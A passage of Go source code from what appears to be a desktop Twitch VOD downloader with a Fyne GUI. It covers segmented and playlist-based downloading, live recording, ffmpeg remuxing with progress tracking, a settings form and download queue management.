				for i := 0; i <= tsI; i++ {
					if queueProgStatus[FindElem(queueID, vodID)].Text == "press_stop" {
						DelQueue(FindElem(queueID, vodID))
						return
					}

					tsURL := "http://vod-secure.twitch.tv/" + vodToken + "/"

					iS := strconv.Itoa(i)

					filename := tempDirectory + `/` + iS + ".ts"

					wg.Add(1)
					go func(n int) {
						err = DownloadFile(filename, tsURL, iS)
						ErrHandle(err)

						c.Increment()
						wg.Done()
					}(i)

					if i != 0 {
						if maxConnection > tsI {
							continue
						}

						if i%maxConnection == 0 {
							dCycle++
							for gState < dCycle*maxConnection {
								if queueProgStatus[FindElem(queueID, vodID)].Text == "press_stop" {
									DelQueue(FindElem(queueID, vodID))
									return
								}

								gState := c.i

								if gState == 0 {
									status.SetText(LoadLang("waitForDownload"))
								} else {
									if gState == (dCycle-1)*maxConnection {
										status.SetText(LoadLang("addQueue"))
									} else {
										status.SetText(LoadLang("downloading") + " " + strconv.FormatFloat(percent.PercentOf(gState-1, tsI), 'f', 2, 64) + "%")
										progressBar.SetValue(float64(gState) / float64(tsI))
										fmt.Printf("%d | %d\n", gState, tsI)
									}
									if gState >= dCycle*maxConnection {
										break
									}
								}
								time.Sleep(time.Second)
							}
						}
					}
				}

				for gState < tsI {
					if queueProgStatus[FindElem(queueID, vodID)].Text == "press_stop" {
						DelQueue(FindElem(queueID, vodID))
						return
					}

					gState := c.i

					if gState < 1 {
						status.SetText(LoadLang("waitForDownload"))
						time.Sleep(time.Second)
						fmt.Printf("%d | %d\n", gState, tsI)
					} else {
						status.SetText(LoadLang("downloading") + " " + strconv.FormatFloat(percent.PercentOf(gState-1, tsI), 'f', 2, 64) + "%")
						progressBar.SetValue(float64(gState) / float64(tsI))
						fmt.Printf("%d | %d\n", gState, tsI)
						if gState >= tsI {
							break
						}
					}

					time.Sleep(time.Second)
				}

				queueProgStatus[FindElem(queueID, vodID)].SetText("wait_incomplete_download")
				status.SetText(LoadLang("waitIncompleteDownload"))
				wg.Wait()

				status.SetText(LoadLang("generateFile"))
				out, err := os.OpenFile(tempDirectory+`/`+vodID+`.ts`, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
				ErrHandle(err)

				queueProgStatus[FindElem(queueID, vodID)].SetText("merge")
				for i := 0; i <= tsI; i++ {
					if queueProgStatus[FindElem(queueID, vodID)].Text == "press_stop" {
						DelQueue(FindElem(queueID, vodID))
						return
					}

					iS := strconv.Itoa(i)

					status.SetText(LoadLang("merging") + " " + strconv.FormatFloat(percent.PercentOf(i, tsI), 'f', 2, 64) + "%")
					progressBar.SetValue(float64(i) / float64(tsI))

					filename, err := os.Open(tempDirectory + `/` + iS + ".ts")
					ErrHandle(err)

					_, err = io.Copy(out, filename)
					ErrHandle(err)
				}
				out.Close()

				queueProgStatus[FindElem(queueID, vodID)].SetText("encode")
				if encoding {
					r, err := regexp.Compile(`time=(\d\d):(\d\d):(\d\d(\.\d\d)?)`)
					ErrHandle(err)

					progressBar.SetValue(0)
					status.SetText(LoadLang("encoding"))

					cmd = PrepareBackgroundCommand(exec.Command(dirBin+"/"+ffmpegBinary, "-y", "-i", tempDirectory+`/`+vodID+`.ts`, "-c", "copy", downloadPath+`/`+vodID+`.`+encodingType))

					stderr, err := cmd.StderrPipe()
					ErrHandle(err)

					err = cmd.Start()
					ErrHandle(err)

					scanner := bufio.NewScanner(stderr)
					scanner.Split(bufio.ScanWords)
					for scanner.Scan() {
						outputFFmpeg := scanner.Text()

						timeFFmpeg := strings.Split(strings.ReplaceAll(strings.Replace(r.FindString(outputFFmpeg), "time=", "", 1), ":", " "), ".")[0]

						if len(timeFFmpeg) == 0 {
							continue
						}

						fmt.Println(timeFFmpeg)

						timeHour, err := strconv.Atoi(strings.Split(timeFFmpeg, " ")[0])
						ErrHandle(err)

						timeMinute, err := strconv.Atoi(strings.Split(timeFFmpeg, " ")[1])
						ErrHandle(err)

						timeSecond, err := strconv.Atoi(strings.Split(timeFFmpeg, " ")[2])
						ErrHandle(err)

						timeSecondsFFmpeg := (timeHour * 3600) + (timeMinute * 60) + timeSecond

						progressBar.SetValue(float64(timeSecondsFFmpeg) / float64(vodTimeInt))
					}

					err = cmd.Wait()
					ErrHandle(err)
				} else {
					queueProgStatus[FindElem(queueID, vodID)].SetText("move")

					inputFile, err := os.Open(tempDirectory + `/` + vodID + `.ts`)
					ErrHandle(err)

					outputFile, err := os.Create(downloadPath + `/` + vodID + `.ts`)
					ErrHandle(err)
					defer outputFile.Close()

					_, err = io.Copy(outputFile, inputFile)
					ErrHandle(err)

					err = inputFile.Close()
					ErrHandle(err)
				}

			} else if downloadOption == "Single" { // Single Download
				if intervalCheck.Checked {
					if !intervalStartCheck.Checked { // 구간 조정
						ssFFmpeg = "00:00:00"
					} else if !intervalStopCheck.Checked {
						h := vodTimeInt / 3600
						m := (vodTimeInt - (3600 * h)) / 60
						s := vodTimeInt - (3600 * h) - (m * 60)

						toFFmpeg = fmt.Sprintf("%d:%d:%d", h, m, s)
					}

					fmt.Printf("Start Time: %s\nEnd Time: %s\n", ssFFmpeg, toFFmpeg)
				}

				// M3U8 수정
				queueProgStatus[FindElem(queueID, vodID)].SetText("loadFile")
				body, err := JsonParseTwitch("https://api.twitch.tv/kraken/videos/" + vodID)

				retryCount := 1

				for err != nil {
					retryCount++

					status.SetText(fmt.Sprintf("재시도 중... [%d]", retryCount))

					if retryCount > 5 {
						dialog.ShowError(fmt.Errorf("해당 영상을 다운받을 수 없습니다"), w)

						return
					}

					body, err = JsonParseTwitch("https://api.twitch.tv/kraken/videos/" + vodID)

					time.Sleep(time.Second)
				}

				var vod TwitchVOD
				err = json.Unmarshal(body, &vod)
				ErrHandle(err)

				if vodType == "highlight" {
					Download(tempDirectory+`/index-dvr.m3u8`, "http://vod-secure.twitch.tv/"+vodToken+"/chunked/highlight-"+vodID+".m3u8")
					ErrHandle(err)
				} else {
					Download(tempDirectory+`/index-dvr.m3u8`, "http://vod-secure.twitch.tv/"+vodToken+"/chunked/index-dvr.m3u8")
					ErrHandle(err)
				}

				indexDVRFile, err := os.OpenFile(tempDirectory+`/index-dvr_fixed.m3u8`, os.O_CREATE|os.O_RDWR|os.O_APPEND, os.FileMode(0777))
				ErrHandle(err)

				indexDVRFileOrg, err := os.Open(tempDirectory + `/index-dvr.m3u8`)
				ErrHandle(err)
				defer indexDVRFileOrg.Close()

				indexDVROrg := bufio.NewScanner(indexDVRFileOrg)

				indexNum := 0
				mutedNum := 0
				mutedTotal := len(vod.MutedSegments) - 1
				for indexDVROrg.Scan() {
					if indexDVROrg.Text()[0:1] == "#" {
						_, err = indexDVRFile.WriteString(indexDVROrg.Text() + "\n")
						ErrHandle(err)
					} else {
						progressBar.SetValue(float64(indexNum) / float64(tsI))

						if mutedNum <= mutedTotal {
							mutedDuration := vod.MutedSegments[mutedNum].Duration
							mutedOffset := vod.MutedSegments[mutedNum].Offset

							if (mutedOffset/10) <= indexNum && (mutedOffset/10)+(mutedDuration/10) > indexNum {
								_, err = indexDVRFile.WriteString("https://vod-secure.twitch.tv/" + vodToken + "/chunked/" + strings.Replace(indexDVROrg.Text(), ".ts", "-muted.ts", 1) + "\n")
								ErrHandle(err)

								if (mutedOffset/10)+((mutedDuration/10)-1) == indexNum {
									mutedNum++
								}
								indexNum++
								continue
							}
						}

						_, err = indexDVRFile.WriteString("https://vod-secure.twitch.tv/" + vodToken + "/chunked/" + indexDVROrg.Text() + "\n")
						ErrHandle(err)

						indexNum++
					}
				}
				// 끝

				queueProgStatus[FindElem(queueID, vodID)].SetText("encode")
				progressBar.SetValue(0)
				if encoding {
					queueProgStatus[FindElem(queueID, vodID)].SetText("downloadAndEncode")

					r, err := regexp.Compile("[0-9]+.ts")
					ErrHandle(err)

					if intervalCheck.Checked {
						fmt.Println("Interval: " + ssFFmpeg + " ~ " + toFFmpeg)

						cmd = PrepareBackgroundCommand(exec.Command(dirBin+"/"+ffmpegBinary, `-y`, `-protocol_whitelist`, `file,http,https,tcp,tls,crypto`, "-ss", ssFFmpeg, "-to", toFFmpeg, "-i", tempDirectory+`/index-dvr_fixed.m3u8`, "-c", "copy", downloadPath+`/`+vodID+`.`+encodingType))
					} else {
						cmd = PrepareBackgroundCommand(exec.Command(dirBin+"/"+ffmpegBinary, `-y`, `-protocol_whitelist`, `file,http,https,tcp,tls,crypto`, "-i", tempDirectory+`/index-dvr_fixed.m3u8`, "-c", "copy", downloadPath+`/`+vodID+`.`+encodingType))
					}

					stderr, err := cmd.StderrPipe()
					ErrHandle(err)

					err = cmd.Start()
					ErrHandle(err)

					scanner := bufio.NewScanner(stderr)
					scanner.Split(bufio.ScanLines)
					for scanner.Scan() {
						outputFFmpeg := scanner.Text()

						statusFFmpeg := strings.Replace(r.FindString(outputFFmpeg), ".ts", "", 1)

						numFFmpeg, err := strconv.Atoi(statusFFmpeg)
						if err != nil {
							continue
						}

						status.SetText(LoadLang("downloadAndEncode"))
						progressBar.SetValue(float64(numFFmpeg) / float64(tsI))
					}

					err = cmd.Wait()
					ErrHandle(err)
				}
			} else if downloadOption == "Recording" { // 녹화
				tsNum := 0
				errorNum := 0
				r, err := regexp.Compile(`Duration: (\d\d):(\d\d):(\d\d)`)
				ErrHandle(err)

				out, err := os.OpenFile(tempDirectory+`/`+vodID+`.ts`, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
				ErrHandle(err)

				queueProgStatus[FindElem(queueID, vodID)].SetText("recording")
				for {
					tsNumStr := strconv.Itoa(tsNum)
					filename := tempDirectory + `/` + tsNumStr + `.ts`

					recStatus, err := RecordFile(filename, "http://vod-secure.twitch.tv/"+vodToken+"/", tsNumStr)
					retryCount := 1

					for err != nil {
						retryCount++

						status.SetText(fmt.Sprintf("재시도 중... [%d]", retryCount))

						if retryCount > 5 {
							dialog.ShowError(fmt.Errorf("해당 영상을 다운받을 수 없습니다"), w)

							return
						}

						recStatus, err = RecordFile(filename, "http://vod-secure.twitch.tv/"+vodToken+"/", tsNumStr)

						time.Sleep(time.Second)
					}

					if recStatus == "error" { // 에러
						if errorNum >= 3 {
							break
						}

						time.Sleep(15 * time.Second)
						errorNum++
						continue
					}

					// 병합
					orgFile, err := os.Open(filename)
					ErrHandle(err)

					_, err = io.Copy(out, orgFile)
					ErrHandle(err)

					err = os.Remove(filename)
					ErrHandle(err)

					cmd = PrepareBackgroundCommand(exec.Command(dirBin+"/"+ffmpegBinary, "-i", tempDirectory+`/`+vodID+`.ts`))

					stderr, err := cmd.StderrPipe()
					ErrHandle(err)

					err = cmd.Start()
					ErrHandle(err)

					scanner := bufio.NewScanner(stderr)
					scanner.Split(bufio.ScanLines)
					for scanner.Scan() {
						outputFFmpeg := scanner.Text()

						fmt.Println(outputFFmpeg)

						timeFFmpeg := strings.ReplaceAll(strings.Replace(r.FindString(outputFFmpeg), "Duration: ", "", 1), ":", " ")

						if len(timeFFmpeg) == 0 {
							continue
						}

						timeHour := strings.Split(timeFFmpeg, " ")[0]
						timeMinute := strings.Split(timeFFmpeg, " ")[1]
						timeSecond := strings.Split(timeFFmpeg, " ")[2]

						status.SetText(LoadLang("recording") + " | " + timeHour + " h " + timeMinute + "m " + timeSecond + "s | " + tsNumStr)
					}
					err = cmd.Wait()
					ErrHandle(err)

					tsNum++
				}
				out.Close()

				// 인코딩
				if encoding {
					r, err := regexp.Compile(`time=(\d\d):(\d\d):(\d\d(\.\d\d)?)`)
					ErrHandle(err)

					progressBar.SetValue(0)
					queueProgStatus[FindElem(queueID, vodID)].SetText("encode")

					cmd = PrepareBackgroundCommand(exec.Command(dirBin+"/"+ffmpegBinary, "-y", "-i", tempDirectory+`/`+vodID+`.ts`, "-c", "copy", downloadPath+`/`+vodID+`.`+encodingType))

					stderr, err := cmd.StderrPipe()
					ErrHandle(err)

					err = cmd.Start()
					ErrHandle(err)

					scanner := bufio.NewScanner(stderr)
					scanner.Split(bufio.ScanWords)
					for scanner.Scan() {
						outputFFmpeg := scanner.Text()

						timeFFmpeg := strings.ReplaceAll(strings.Replace(r.FindString(outputFFmpeg), "time=", "", 1), ":", " ")

						if len(timeFFmpeg) == 0 {
							continue
						}

						timeHour, err := strconv.Atoi(strings.Split(timeFFmpeg, " ")[0])
						ErrHandle(err)

						timeMinute, err := strconv.Atoi(strings.Split(timeFFmpeg, " ")[1])
						ErrHandle(err)

						timeSecond, err := strconv.Atoi(strings.Split(timeFFmpeg, " ")[2])
						ErrHandle(err)

						timeSecondsFFmpeg := (timeHour * 3600) + (timeMinute * 60) + timeSecond

						progressBar.SetValue(float64(timeSecondsFFmpeg) / float64(vodTimeInt))
					}

					err = cmd.Wait()
					ErrHandle(err)
				} else {
					inputFile, err := os.Open(tempDirectory + `/` + vodID + `.ts`)
					ErrHandle(err)

					outputFile, err := os.Create(downloadPath + `/` + vodID + `.ts`)
					ErrHandle(err)
					defer outputFile.Close()

					_, err = io.Copy(outputFile, inputFile)
					ErrHandle(err)

					err = inputFile.Close()
					ErrHandle(err)
				}
			}

			progressBar.SetValue(1)
			notify.Alert(title, "Notice", "Download Complete", dirThumb+"/"+vodID+".jpg")

			fmt.Println(FindElem(queueID, vodID))
			DelQueue(FindElem(queueID, vodID))

			ClearDir(tempDirectory)

			status.SetText(LoadLang("downloadComplete"))

			OpenURL(downloadPath)
		}()
	})

	queueButton := widget.NewButtonWithIcon("", theme.MailSendIcon(), func() {
		moreInfoW := a.NewWindow(title)

		moreInfoW.SetContent(MoreView(moreInfoW))
		moreInfoW.Resize(fyne.NewSize(500, 400))
		moreInfoW.SetFixedSize(true)
		moreInfoW.CenterOnScreen()
		moreInfoW.Show()
	})

	buttonBox := widget.NewHBox(
		layout.NewSpacer(),
		queueButton,
		button,
	)

	intervalBox := widget.NewHBox(
		intervalCheck,
		layout.NewSpacer(),
	)

	searchBox := widget.NewVBox(
		keyEntry,    // 주소 입력
		buttonBox,   // 다운로드 버튼
		intervalBox, // 구간 다운로드 버튼
	)

	homeLayoutBox := widget.NewVBox(
		layout.NewSpacer(),
		layout.NewSpacer(),
		searchBox,
		layout.NewSpacer(),
	)

	return homeLayoutBox
}

//Advanced 설정
func Advanced(w2 fyne.Window) fyne.CanvasObject { // 설정
	defer Recover() // 복구

	defLang := widget.NewRadio([]string{"English", "Korean"}, func(langOption string) {})

	downOption := widget.NewSelect([]string{"Multi", "Single"}, func(c string) {
		a.Preferences().SetString("downloadOption", c)
	})

	defMaxConnection := widget.NewSelect([]string{"10", "100", "500", "1000"}, func(maxConNum string) {
		a.Preferences().SetString("maxConnection", maxConNum)
	})

	defDownDirEntry := widget.NewEntry()

	defDownDir := widget.NewButtonWithIcon(LoadLang("fileExplorer"), theme.FolderOpenIcon(), func() {
		go func() {
			selDownDir, err := dlog.Directory().Title(title).Browse()
			if err == nil {
				if len(selDownDir) != 0 {
					a.Preferences().SetString("downloadDir", selDownDir)

					defDownDirEntry.SetText(selDownDir)
				}
			}
		}()
	})

	defSelEnc := widget.NewSelect([]string{"true", "false"}, func(enc string) {
		a.Preferences().SetString("encodingStatus", enc)
	})

	defSelEncType := widget.NewSelect([]string{"mp4", "avi", "mkv"}, func(encType string) {
		a.Preferences().SetString("encodingType", encType)
	})

	defErrorHandle := widget.NewSelect([]string{"true", "false"}, func(s string) {
		a.Preferences().SetString("errorHandle", s)
	})

	resetSetting := widget.NewButtonWithIcon(LoadLang("resetSetting"), theme.ViewRefreshIcon(), func() {
		fmt.Println("Reset")

		dialog.ShowConfirm(title, LoadLang("realResetSetting"), func(b bool) {
			if b {
				a.Preferences().RemoveValue("language")
				a.Preferences().RemoveValue("downloadOption")
				a.Preferences().RemoveValue("maxConnection")
				a.Preferences().RemoveValue("downloadDir")
				a.Preferences().RemoveValue("encodingStatus")
				a.Preferences().RemoveValue("encodingType")
				a.Preferences().RemoveValue("errorHandle")

				RunAgain()
			}
		}, w2)
	})

	saveSettingLayout := fyne.NewContainerWithLayout(layout.NewBorderLayout(nil, nil, resetSetting, nil), resetSetting)

	defLang.SetSelected(a.Preferences().String("language"))
	downOption.SetSelected(a.Preferences().String("downloadOption"))
	defMaxConnection.SetSelected(a.Preferences().String("maxConnection"))
	defDownDirEntry.SetText(a.Preferences().String("downloadDir"))
	defSelEnc.SetSelected(a.Preferences().String("encodingStatus"))
	defSelEncType.SetSelected(a.Preferences().String("encodingType"))
	defErrorHandle.SetSelected(a.Preferences().String("errorHandle"))

	defLang.OnChanged = func(s string) {
		fmt.Println(s)

		dialog.ShowConfirm(title, LoadLang("askRunAgainLang"), func(c bool) {
			if c {
				a.Preferences().SetString("language", s)

				RunAgain()
			}
		}, w2)
	}

	form := &widget.Form{}

	defLangBox := widget.NewHBox(defLang)
	defDownOptionBox := widget.NewHBox(downOption)
	defMaxConnectionBox := widget.NewHBox(defMaxConnection)
	defDownDirBox := widget.NewHBox(defDownDirEntry, defDownDir)
	defSelEncBox := widget.NewHBox(defSelEnc)
	defSelEncTypeBox := widget.NewHBox(defSelEncType)
	defErrorHandleBox := widget.NewHBox(defErrorHandle)

	form.Append(LoadLang("optionLanguage"), defLangBox)
	form.Append(LoadLang("optionDownload"), defDownOptionBox)
	form.Append(LoadLang("optionMaxConnection"), defMaxConnectionBox)
	form.Append(LoadLang("optionDownloadLocation"), defDownDirBox)
	form.Append(LoadLang("optionEncoding"), defSelEncBox)
	form.Append(LoadLang("optionEncodingType"), defSelEncTypeBox)
	form.Append(LoadLang("optionErrorHandle"), defErrorHandleBox)

	settingMenu := widget.NewVBox(
		widget.NewGroup(LoadLang("defaultSetting"),
			form,
			saveSettingLayout,
		),
	)

	return settingMenu
}

//AddQueue 대기열 추가
func AddQueue(title, vodid, time, thumb string, prog *widget.ProgressBar, status *widget.Label, progStatus *widget.Entry, cmd *exec.Cmd) {
	defer Recover() // 복구

	fmt.Println("--- 대기열 추가")
	fmt.Println("ID: " + vodid)
	fmt.Println("Title: " + title)
	fmt.Println("Time: " + time)
	fmt.Println("Thumbnail: " + thumb)

	thumbnailPath := fmt.Sprintf("%s/%s.jpg", dirThumb, vodid)

	Download(thumbnailPath, thumb)

	// string
	queueID = append(queueID, vodid)
	queueTitle = append(queueTitle, title)
	queueTime = append(queueTime, time)
	queueThumb = append(queueThumb, fmt.Sprintf("%s/%s.jpg", dirThumb, vodid))

	// widget.ProgressBar
	queueProgress = append(queueProgress, prog)

	// widget.Entry
	queueProgStatus = append(queueProgStatus, progStatus)

	// widget.Label
	queueStatus = append(queueStatus, status)

	// exec.Cmd
	queueCmd = append(queueCmd, cmd)
}

//DelQueue 대기열 삭제
func DelQueue(i int) {
	defer Recover() // 복구

	// string
	queueID = queueID[:i+copy(queueID[i:], queueID[i+1:])]
	queueTitle = queueTitle[:i+copy(queueTitle[i:], queueTitle[i+1:])]
	queueTime = queueTime[:i+copy(queueTime[i:], queueTime[i+1:])]
	queueThumb = queueThumb[:i+copy(queueThumb[i:], queueThumb[i+1:])]

	// widget.ProgressBar
	queueProgress = queueProgress[:i+copy(queueProgress[i:], queueProgress[i+1:])]

	// widget.Entry
	queueProgStatus = queueProgStatus[:i+copy(queueProgStatus[i:], queueProgStatus[i+1:])]

	// widget.Label
	queueStatus = queueStatus[:i+copy(queueStatus[i:], queueStatus[i+1:])]

	// exec.Cmd
	queueCmd = queueCmd[:i+copy(queueCmd[i:], queueCmd[i+1:])]
}

//MoreView 대기열 창
func MoreView(moreInfoW fyne.Window) *widget.ScrollContainer {
	defer Recover() // 복구

	queue := widget.NewGroup("대기열")

	fmt.Println(queueID)
	fmt.Println(len(queueID))
	fmt.Println(queueTitle)
	fmt.Println(queueTime)
	fmt.Println(queueThumb)

	if len(queueID) != 0 {
		for i := range queueID {
			fmt.Println("--- 대기열 로드")
			fmt.Println("Title: " + queueTitle[i])
			fmt.Println("Time: " + queueTime[i])
			fmt.Println("Thumbnail: " + queueThumb[i])

			queueVODID := queueID[i]

			queueTimeInt, err := strconv.Atoi(queueTime[i])
			ErrHandle(err)

			var stopButton *widget.Button
			stopButton = widget.NewButtonWithIcon(LoadLang("cancel"), theme.CancelIcon(), func() {
				stopProg := dialog.NewProgressInfinite(title, "진행 중지를 기다리는 중...", moreInfoW)
				stopProg.Show()

				switch queueProgStatus[i].Text {
				case "wait":
					stopProg.Hide()
					dialog.ShowInformation(title, LoadLang("stoppedNoStatus"), moreInfoW)
				case "download":
					queueProgStatus[i].SetText("press_stop")

					for {
						if !ContainsElem(queueID, queueVODID) {
							break
						}

						time.Sleep(time.Second)
					}

					stopProg.Hide()
					dialog.ShowInformation(title, LoadLang("stoppedDownload"), moreInfoW)
					notify.Alert(title, "Notice", "Download Canceled", dirThumb+"/"+queueVODID+".jpg")
				case "merge":
					queueProgStatus[i].SetText("press_stop")

					for {
						if !ContainsElem(queueID, queueVODID) {
							break
						}

						time.Sleep(time.Second)
					}

					stopProg.Hide()
					dialog.ShowInformation(title, LoadLang("stoppedDownload"), moreInfoW)
					notify.Alert(title, "Notice", "Download Canceled", dirThumb+"/"+queueVODID+".jpg")
				case "move":
					queueProgStatus[i].SetText("press_stop")

					for {
						if !ContainsElem(queueID, queueVODID) {
							break
						}

						time.Sleep(time.Second)
					}

					stopProg.Hide()
					dialog.ShowInformation(title, LoadLang("stoppedDownload"), moreInfoW)
					notify.Alert(title, "Notice", "Download Canceled", dirThumb+"/"+queueVODID+".jpg")
				case "encode":
					stopProg.Hide()
					dialog.ShowInformation(title, LoadLang("stoppedNoStatus"), moreInfoW)
				case "wait_incomplete_download":
					stopProg.Hide()
					dialog.ShowInformation(title, LoadLang("stoppedNoStatus"), moreInfoW)
				}

				canvas.Refresh(moreInfoW.Content())
				stopButton.Disable()
			})

			if queueProgStatus[i].Text == "encode" {
				stopButton.Disable()
			}

			h := queueTimeInt / 3600
			m := (queueTimeInt - (3600 * h)) / 60
			s := queueTimeInt - (3600 * h) - (m * 60)

			moreViewForm := widget.NewVBox(
				widget.NewLabel(fmt.Sprintf("%s: %s", LoadLang("vodTitle"), queueTitle[i])),
				widget.NewLabel(fmt.Sprintf("%s: %d시간 %d분 %d초", LoadLang("vodTime"), h, m, s)),
				widget.NewHBox(queueStatus[i], layout.NewSpacer(), stopButton),
			)

			vodThumbnailImg := &canvas.Image{
				File:     queueThumb[i],
				FillMode: canvas.ImageFillOriginal,
			}
			canvas.Refresh(vodThumbnailImg)

			queueInfo := fyne.NewContainerWithLayout(
				layout.NewHBoxLayout(), vodThumbnailImg, moreViewForm,
			)

			queueLayout := widget.NewVBox(
				queueInfo,
				queueProgress[i],
			)

			queue.Append(queueLayout)
		}
	} else {
		queue.Append(widget.NewLabelWithStyle(LoadLang("noQueue"), fyne.TextAlignCenter, fyne.TextStyle{Bold: false}))
	}

	return widget.NewScrollContainer(queue)
}
